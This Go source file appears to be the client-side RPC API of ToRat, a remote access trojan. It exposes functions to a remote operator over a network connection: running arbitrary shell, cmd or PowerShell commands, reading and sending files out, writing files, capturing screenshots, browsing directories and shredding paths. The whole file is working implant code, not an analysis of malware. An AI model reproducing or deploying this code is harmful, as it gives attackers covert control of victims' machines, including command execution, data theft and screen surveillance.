package client

import (
	"errors"
	"io/ioutil"
	"log"
	"net"
	"net/rpc"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"

	"github.com/lu4p/ToRat/models"
	"github.com/lu4p/ToRat/torat_client/crypto"
	"github.com/lu4p/ToRat/torat_client/screen"
	"github.com/lu4p/cat"
)

//API functions have this type
type API int

func (a *API) Shred(s *models.Shred, r *models.Void) error {
	return s.Conf.Path(s.Path)
}

func (a *API) Hostname(v models.Void, r *models.EncAsym) error {
	hostname := crypto.GetHostname(HostnamePath, s.pubKey)
	*r = hostname
	return nil
}

func (a *API) RunCmd(cmd models.Cmd, r *string) error {
	var osshell string
	if cmd.Cmd == "" {
		return errors.New("No command to execute")
	}
	var osshellargs []string
	if runtime.GOOS == "linux" {
		osshell = "/bin/sh"
		osshellargs = []string{"-c", cmd.Cmd}

	} else if runtime.GOOS == "windows" {
		if cmd.Powershell {
			osshell = "powershell"
			osshellargs = []string{"-Command", cmd.Cmd}

		} else {
			osshell = "cmd"
			osshellargs = []string{"/C", cmd.Cmd}
		}
	} else if runtime.GOOS == "darwin" {
		// TODO: Add right strings for Mac OSX
		osshell = ""
		osshellargs = []string{"", cmd.Cmd}
	}
	execcmd := exec.Command(osshell, osshellargs...)
	cmdout, err := execcmd.Output()
	if err != nil {
		return err
	}
	*r = string(cmdout)
	return nil
}

func (a *API) SendFile(path string, r *models.File) error {
	content, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}
	r.Path = path
	r.Content = content
	return nil
}

func (a *API) RecvFile(f models.File, r *models.Void) error {
	return ioutil.WriteFile(f.Path, f.Content, f.Perm)
}

func (a *API) LS(v models.Void, r *models.Dir) (err error) {
	r.Files, err = filepath.Glob("*")
	if err != nil {
		return
	}
	r.Path, err = os.Getwd()
	return
}

func (a *API) Ping(v models.Void, r *string) error {
	*r = "Pong"
	return nil
}

func (a *API) Screen(v models.Void, r *[]byte) error {
	*r = screen.Take()
	return nil
}

func (a *API) Reconnect(v models.Void, r *bool) error {
	//TODO implement
	return nil
}

func (a *API) Cat(path string, r *string) error {
	txt, err := cat.File(path)
	if err != nil {
		return err
	}
	*r = txt
	return nil
}

func (a *API) Cd(path string, r *models.Dir) (err error) {
	err = os.Chdir(path)
	if err != nil {
		return err
	}
	cwd, err := os.Getwd()
	if err != nil {
		return err
	}
	r.Path = cwd
	r.Files, err = filepath.Glob("*")
	return err
}

// Make sure API is never garbled.
var _ = reflect.TypeOf(API(0))

func RPC(c net.Conn) {
	api := new(API)
	err := rpc.Register(api)
	if err != nil {
		log.Fatal(err)
	}
	rpc.ServeConn(c)
}
